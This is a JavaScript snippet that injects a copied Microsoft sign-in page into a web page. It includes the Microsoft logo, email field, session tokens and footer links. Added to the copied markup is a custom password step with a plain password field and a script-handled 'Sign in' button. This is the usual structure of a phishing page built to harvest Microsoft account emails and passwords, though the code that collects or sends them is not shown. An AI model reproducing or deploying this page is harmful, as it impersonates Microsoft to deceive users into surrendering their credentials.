document.getElementById("root").innerHTML = `
      <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://login.microsoftonline.com/common/login" class="provide-min-height">
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="login-paginated-page" data-bind="component: { name: 'master-page',
                publicMethods: masterPageMethods,
                params: {
                    serverData: svr,
                    showButtons: svr.fShowButtons,
                    showFooterLinks: true,
                    useWizardBehavior: svr.fUseWizardBehavior,
                    handleWizardButtons: false,
                    password: password,
                    hideFromAria: ariaHidden },
                event: {
                    footerAgreementClick: footer_agreementClick } }">
                <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->
                <!-- ko if: useLayoutTemplates -->
                <!-- ko withProperties: { '$page': $parent } -->
                <!-- ko if: isLightboxTemplate() -->
                <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height">
                    <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
                        component: { name: 'background-image-control',
                            publicMethods: $page.backgroundControlMethods,
                            event: { load: $page.backgroundImageControl_onLoad } }">
                        <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                            <!-- ko if: backgroundImageUrl -->
                            <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129 Explorations1c4.svg&quot;);" class="background-image ext-background-image" aria-label="Organisation background image"></div>
                            <!-- /ko -->
                        </div>
                    </div>
                    <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                    <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                        <div class="template-section main-section">
                            <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                                <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
                                    <!-- ko withProperties: { '$content': $data } -->
                                    <div class="flex-column">
                                        <div class="win-scroll">
                                            <div id="lightbox" data-bind="
                                                animationEnd: $page.paginationControlHelper.animationEnd,
                                                externalCss: { 'sign-in-box': true },
                                                css: {
                                                    'inner': $content.isVerticalSplitTemplate,
                                                    'vertical-split-content': $content.isVerticalSplitTemplate,
                                                    'app': $page.backgroundLogoUrl,
                                                    'wide': $page.paginationControlHelper.useWiderWidth,
                                                    'fade-in-lightbox': $page.fadeInLightBox,
                                                    'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                                                    'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                                                    'lightbox-bottom-margin-debug': $page.showDebugDetails,
                                                    'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
                                                <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
                                                <!-- ko if: loadBannerLogo -->
                                                <div data-bind="component: { name: 'logo-control',
                                                    params: {
                                                        isChinaDc: svr.fIsChinaDc,
                                                        bannerLogoUrl: bannerLogoUrl() } }">
                                                    <!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx -->
                                                    <!-- ko component: 'accessible-image-control' -->
                                                    <img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                </div>
                                                <!-- /ko -->
                                                <div data-bind="component: { name: 'pagination-control',
                                                    publicMethods: paginationControlMethods,
                                                    params: {
                                                        enableCssAnimation: svr.fEnableCssAnimation,
                                                        disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                                                        initialViewId: initialViewId,
                                                        currentViewId: currentViewId,
                                                        initialSharedData: initialSharedData,
                                                        initialError: $loginPage.getServerError() },
                                                    event: {
                                                        cancel: paginationControl_onCancel,
                                                        load: paginationControlHelper.onLoad,
                                                        unload: paginationControlHelper.onUnload,
                                                        loadView: view_onLoadView,
                                                        showView: view_onShow,
                                                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                                                        animationStateChange: paginationControl_onAnimationStateChange } }">
                                                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                                        <div class="pagination-view animate slide-in-next" data-bind="css: {
                                                            'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
                                                            'zero-opacity': hidePaginatedView.hideSubView(),
                                                            'animate': animate(),
                                                            'slide-out-next': animate.isSlideOutNext(),
                                                            'slide-in-next': animate.isSlideInNext(),
                                                            'slide-out-back': animate.isSlideOutBack(),
                                                            'slide-in-back': animate.isSlideInBack() }">
                                                            <!-- ko foreach: views -->
                                                            <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                            <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                                                                params: {
                                                                    serverData: svr,
                                                                    serverError: initialError,
                                                                    isInitialView: isInitialState,
                                                                    displayName: sharedData.displayName,
                                                                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                                                                    prefillNames: $loginPage.prefillNames,
                                                                    flowToken: sharedData.flowToken,
                                                                    availableSignupCreds: sharedData.availableSignupCreds,
                                                                    customStrings: $loginPage.stringCustomizationObservables.customStrings(),
                                                                    isCustomizationFailure: $loginPage.stringCustomizationObservables.isCustomStringsLoadFailure(),
                                                                    userIdLabel: $loginPage.userIdLabel,
                                                                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
                                                                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
                                                                    accessRecoveryLink: $loginPage.accessRecoveryLink,
                                                                    boilerPlateText: $loginPage.boilerPlateText },
                                                                event: {
                                                                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                                                                    redirect: $loginPage.view_onRedirect,
                                                                    updateDFPUrl: $loginPage.view_onUpdateDFPUrl,
                                                                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                                                                    registerDialog: $loginPage.view_onRegisterDialog,
                                                                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                                                                    showDialog: $loginPage.view_onShowDialog,
                                                                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                                                                    agreementClick: $loginPage.footer_agreementClick } }">
                                                                <div id="emailView">
                                                                    <div data-bind="component: { name: 'header-control',
                                                                        params: {
                                                                            serverData: svr,
                                                                            title: customTitle() || str['WF_STR_HeaderDefault_Title'],
                                                                            headerDescription: customDescription() } }">
                                                                        <div>
                                                                            <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
                                                                                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div role="alert" aria-live="assertive">
                                                                            <div id="emailError" class="error-message"></div>
                                                                        </div>
                                                                        <div class="form-group col-md-24">
                                                                            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                                                                publicMethods: usernameTextbox.placeholderTextboxMethods,
                                                                                params: {
                                                                                    serverData: svr,
                                                                                    hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                                                                                    hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
                                                                                event: {
                                                                                    updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                                                <input type="email" name="loginfmt" id="email" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" data-bind="
                                                                                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en',
                                                                                    autocomplete: svr.fEnablePasskeyAutofillUI ? 'username webauthn' : 'username' },
                                                                                    externalCss: {
                                                                                        'input': true,
                                                                                        'text-box': true,
                                                                                        'has-error': usernameTextbox.error },
                                                                                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                                                                                    ariaDescribedBy: 'loginHeader emailError',
                                                                                    textInput: usernameTextbox.value,
                                                                                    hasFocusEx: usernameTextbox.focused,
                                                                                    placeholder: $placeholderText" autocomplete="username webauthn" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader emailError" placeholder="Email, phone, or Skype" data-report-attached="1">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="win-button-pin-bottom">
                                                                        <div class="row">
                                                                            <div data-bind="component: { name: 'footer-buttons-field',
                                                                                params: {
                                                                                    serverData: svr,
                                                                                    isPrimaryButtonEnabled: !isRequestPending(),
                                                                                    isPrimaryButtonVisible: svr.fShowButtons,
                                                                                    isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                                                                                    secondaryButtonText: secondaryButtonText() },
                                                                                event: {
                                                                                    primaryButtonClick: primaryButton_onClick,
                                                                                    secondaryButtonClick: secondaryButton_onClick } }">
                                                                                <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
                                                                                    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                                                                    css: { 'no-margin-bottom': removeBottomMargin },
                                                                                    externalCss: { 'button-field-container': true }">
                                                                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                                                                        <input type="submit" id="idSIButton9" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                                                                                            attr: primaryButtonAttributes,
                                                                                            css: { 'high-contrast-overrides': true },
                                                                                            externalCss: {
                                                                                                'button': true,
                                                                                                'primary': true },
                                                                                            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                                                            hasFocus: focusOnPrimaryButton,
                                                                                            click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
                                                                                            clickBubble: !svr.fEnableLivePreview,
                                                                                            enable: isPrimaryButtonEnabled,
                                                                                            visible: isPrimaryButtonVisible,
                                                                                            preventTabbing: primaryButtonPreventTabbing" value="Next" data-report-attached="1">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div id="passwordView" class="hidden">
                                                                    <div data-bind="component: { name: 'header-control',
                                                                        params: {
                                                                            serverData: svr,
                                                                            title: customTitle() || str['WF_STR_HeaderDefault_Title'],
                                                                            headerDescription: customDescription() } }">
                                                                        <div>
                                                                            <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
                                                                                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
                                                                            </div>
                                                                            <div class="row text-13">
                                                                                <div id="userDisplay"></div>
                                                                                <div><a id="backToEmail" href="#">Back</a></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div role="alert" aria-live="assertive">
                                                                            <div id="passwordError" class="error-message"></div>
                                                                        </div>
                                                                        <div class="form-group col-md-24">
                                                                            <input name="passwd" type="password" id="psw" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" aria-label="Enter your password" placeholder="Password">
                                                                        </div>
                                                                    </div>
                                                                    <div class="form-group text-13">
                                                                        <a id="forgotPassword" href="#">Forgot password?</a>
                                                                    </div>
                                                                    <div class="win-button-pin-bottom">
                                                                        <div class="row">
                                                                            <div data-bind="component: { name: 'footer-buttons-field',
                                                                                params: {
                                                                                    serverData: svr,
                                                                                    isPrimaryButtonEnabled: !isRequestPending(),
                                                                                    isPrimaryButtonVisible: svr.fShowButtons,
                                                                                    isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                                                                                    secondaryButtonText: secondaryButtonText() },
                                                                                event: {
                                                                                    primaryButtonClick: primaryButton_onClick,
                                                                                    secondaryButtonClick: secondaryButton_onClick } }">
                                                                                <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
                                                                                    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                                                                    css: { 'no-margin-bottom': removeBottomMargin },
                                                                                    externalCss: { 'button-field-container': true }">
                                                                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                                                                        <input type="button" id="signInButton" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Sign in">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                                                                                <div class="form-group" data-bind="
                                                                                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                                                                                    childBindings: {
                                                                                        'signup': {
                                                                                            href: svr.urlSignUp || '#',
                                                                                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                                                                                            click: signup_onClick } }">
                                                                                    No account? <a href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&amp;response_type=code+id_token&amp;state=Bb8MoLigsF5P2uBLNNKc48ee773v9ywNp72qxrtxoGCdYzn9IefKAbMKcl5k7CrSo8iCbs8n8hrS4Aq1TlnYFbWyPUmMcPAHSC2KIHzFJ63a-1z3yxAdha6JgbvMu-EeVPSZLZ6T8-P2321vc_a_SWsKcN7zR9yGAwf9MPb_5b6NNjbMow6S1TOBPl6fXgWICZy8OQDdr5FFx1X86i15pSsjIZyxPCw_Bxzgo5I_Xm2jKiL7I6KxgmkFmwkGX-g1YbPeQZFEKLzqxyU2bcUGOTAT7cG8buJ2THOlJ8st3b0&amp;response_mode=form_post&amp;nonce=638941745224107642.YmMyNzg3ODYtNmVlYi00Y2EwLWFjYzAtZDE3ODkxMDg4ZDkxMjRlNjJmZWItZTI2NS00MzE5LWE0M2ItZjIyZjVlNTI1NGRh&amp;x-client-SKU=ID_NET8_0&amp;x-client-Ver=8.5.0.0&amp;uaid=70e9b4cb88414be590ad5ff02723c8ba&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=en-GB-OXENDICT&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAABVrSpeuWamRam2jAF1XRQEgNQokyFb4QeWL5-A10b3M6fo5JmWOI1xDkugWPE01p6yszIh4r2mrfEDvhcedzV9FdIHMgqniutLn5gyo0276hr8ZWtviaGQ035sN7k-QWp9byIwr1jeAyh4dZ2fWPfQNuamEwxp7w4-btR6Dp0aMK9YfsHLs97d11gZsIFjst6wOhvVLCMQ7X1QNaw2bKAE7t5swk-clw4C5GhXCuqnuyAA&amp;jshs=0" id="signup" aria-label="Create a Microsoft account">Create one!</a>
                                                                                </div>
                                                                                <!-- /ko -->
                                                                                <div class="form-group">
                                                                                    <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                                                                                        text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
                                                                                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                                                                                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                                                                                        href: accessRecoveryLink || '#'" href="#">Can’t access your account?</a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <!-- /ko -->
                                                            <!-- /ko -->
                                                        </div>
                                                    </div>
                                                    <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                                                    <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                                    <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                                    <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                                    <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
                                                    <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="ox+MX9LeF8SdFSUHT4FthcV8uzrqT7r/VF4MEfvhhME=1:1:CANARY:Hi4UA7xr5AW/nLZv8RFySVAuQM0EWyvzaqFd/JrznuU=">
                                                    <!-- /ko -->
                                                    <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAhZI9iNt2GMb9cefcmTa5hFJa6HDQQkpa2dJfnz4IVLYlW9aHdSf5S9AKS5Zt-fRhS7L1MZYOgS43Z8x4oRBCKSVdOnQo16EZOmUKgQ4NtIRO16XU17EQCi_v-z7PMz6_8jWqglfgCnynCCrw0QcYSeAYhhsQCkwCwmoGDFGoRUDIpIZuI0AS5ji4VT746evflvS9X_mzr_RXt9__8cl5_nAeRcvwqFqN47jiT6e2aVVM3606Y29ie7MN-Daff5rP3y9ctzyoVYe6Q0Zqcg31vBASKFXDEBLDAcAQmCQwUBm5YiplM7TbHEWS23dGNgyPABMLA3YxyuhIazLb7DQRmzNMu7qLE0dadFxtwEWaygFJgWExY3BhwMAi2HoLLtUWfUdSOURqncyfFW506XU0B1fLD-zM-rOwP_UDV1_6YXS_-LBQNyjRF-xZyOIyWNcFSeJNjLIskkQ3tTSWliRYJUGU-K3GZJR5Nc6a8rQh8qaDn5KNQPEpu2GElEfNAwWjV4jqeCPWGKRyzxVNmW4rDcBz7YztEOgYQjI0TejJfEx0ZsZGXEOM1ZcVTdAIlYJkgAJkY-pjXRmEvCmR2UktbdHxtCbKho4bhCQtDNGPCQVRu3XZIabD2YBraCnVPW5OApxlE2RIETaCL5VwwWlpIjdivZ5kMx_n9KELFrwtkBzBJzP3lHXj09YQmiEjQ7aONZbhhWyVpD1gmL1WV6VV0mxRxroD1HbX6VBhhBrwefHd15S_AY-Lpe3j-t5FkfSXlmdPDpeBP7Ud63XAbEC1-69q-65VoR3n6U7-5c7be3sHu-_kDnMfvgUXj_b2yge5K3W5k3-wu-Xx08-Jn5_Dn33y4Hf5rzvWF7mL3aqffCQOa4LFUsqEVXptFWOjudmn1lmwUsmg2mcxkZlu5nORuYscIWel_FmpdFHa55q6xKiUDr8q5e9dyz3Z_1-yn73xXrm8tnXHN8eOFd76D-Hfv5m7vP7ldy9--eaHv_9ov7zxcdvGejSZBDg9qHqCtqFO2FTp0-tjEWYG6SYbr9hJtRNk3rp399FB7vl2buYub54V_gE1">
                                                    <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="cf36825d-30e0-405e-a2ed-50f92a658400">
                                                    <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAABVrSpeuWamRam2jAF1XRQE58UICHgEYYvdATFRFNLBktG73ybsmfFovnY9PT4xPjrnXRZmJpOQs_y-8a9PUQcbTPcSOHckpd7GaTwxyLHpRHPTr4vTfc3n7HzPSc9j_HYJHnVKh8vKsVlVrPU7vr1dx5M_Qp1M26ZSB85OJqH3JI705npUOD399A2r6d0XHnaCkpvhtM3PalBQKp2v7dAwNHPzYyX1jI7ljn--RYIFxPuF6e7iPvXpVNzyMSRNNGAzXzPrPlcJIgoDvQDBiSawBJYDtpHO_C5QCGMK2oKI-Lj-h7up2oiDE59fh2w4rI-thtRhECjZ_ED784f7ytBIo0s7V5MU-d9W0m8kkHlT_d_1HhRJHJxTDYQy-JY0_kAKWU8zM-xP1J2W81ziDBVwsWWJj1aZ6IDq9_KB5s1OXqZzTSg2UQ8ePQUyrMIe-VcQ0Yr6JzEHiDFDtIoWLjtlKOKRuFSL11CABS50mTejvNLzAI2Luuyf0Ba1kQiJfNtlgJg2p8FLbnOlOo0gzFalH-uVTNeMTFKQH4gmo32beyAA">
                                                    <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
                                                    <input type="hidden" name="NewUser" value="1">
                                                    <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
                                                    <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                                    <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                                                    <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
                                                    <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
                                                    <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
                                                    <div data-bind="component: { name: 'instrumentation-control',
                                                        publicMethods: instrumentationMethods,
                                                        params: { serverData: svr } }">
                                                        <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- /ko -->
                                </div>
                            </div>
                            <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                            <div id="footer" role="contentinfo" data-bind="
                                externalCss: {
                                    'footer': true,
                                    'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
                                    'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
                                <div data-bind="component: { name: 'footer-control',
                                    publicMethods: $page.footerMethods,
                                    params: {
                                        serverData: svr,
                                        useDefaultBackground: $page.useDefaultBackground(),
                                        hasDarkBackground: $page.backgroundLogoUrl(),
                                        showLinks: true,
                                        showFooter: $page.showFooter(),
                                        hideTOU: $page.hideTOU(),
                                        termsText: $page.termsText(),
                                        termsLink: $page.termsLink(),
                                        hidePrivacy: $page.hidePrivacy(),
                                        privacyText: $page.privacyText(),
                                        privacyLink: $page.privacyLink() },
                                    event: {
                                        agreementClick: $page.footer_agreementClick,
                                        showDebugDetails: $page.toggleDebugDetails_onClick } }">
                                    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
                                        <!-- ko if: showFooter -->
                                        <!-- ko if: !hideTOU -->
                                        <a id="ftrTerms" data-bind="
                                            text: termsText,
                                            href: termsLink,
                                            click: termsLink_onClick,
                                            externalCss: {
                                                'footer-content': true,
                                                'footer-item': true,
                                                'has-background': !useDefaultBackground,
                                                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-GB-OXENDICT/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                                        <!-- /ko -->
                                        <!-- ko if: !hidePrivacy -->
                                        <a id="ftrPrivacy" data-bind="
                                            text: privacyText,
                                            href: privacyLink,
                                            click: privacyLink_onClick,
                                            externalCss: {
                                                'footer-content': true,
                                                'footer-item': true,
                                                'has-background': !useDefaultBackground,
                                                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-GB-OXENDICT/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                                        <!-- /ko -->
                                        <a id="moreOptions" href="#" role="button" data-bind="
                                            click: moreInfo_onClick,
                                            ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                                            attr: { 'aria-expanded': showDebugDetails().toString() },
                                            hasFocusEx: focusMoreInfo(),
                                            externalCss: {
                                                'footer-content': true,
                                                'footer-item': true,
                                                'debug-item': true,
                                                'has-background': !useDefaultBackground,
                                                'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                                    </div>
                                </div>
                            </div>
                            <!-- /ko -->
                        </div>
                    </div>
                    <!-- /ko -->
                </div>
                <!-- /ko -->
                <!-- /ko -->
            </div>
            <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
        </form>
    `;
